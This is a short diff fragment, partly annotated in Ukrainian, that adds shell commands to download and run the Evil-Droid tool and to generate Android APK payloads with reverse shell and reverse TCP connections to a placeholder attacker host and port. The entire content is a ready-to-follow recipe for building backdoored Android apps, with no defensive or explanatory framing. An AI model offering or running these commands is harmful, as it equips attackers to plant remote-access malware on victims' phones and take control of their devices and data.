@@ -1,0 +1,9 @@
+git clone https://github.com/M4sc3r4n0/Evil-Droid.git
+cd Evil-Droid
+chmod +x evil-droid
+./evil-droid
+
+
+./evil-droid -g -t reverse_shell -p <LHOST> -l <LPORT>
+Згенерувати корисне навантаження APK за допомогою зворотного TCP-з'єднання:
+./evil-droid -g -t reverse_tcp -p <LHOST> -l <LPORT>
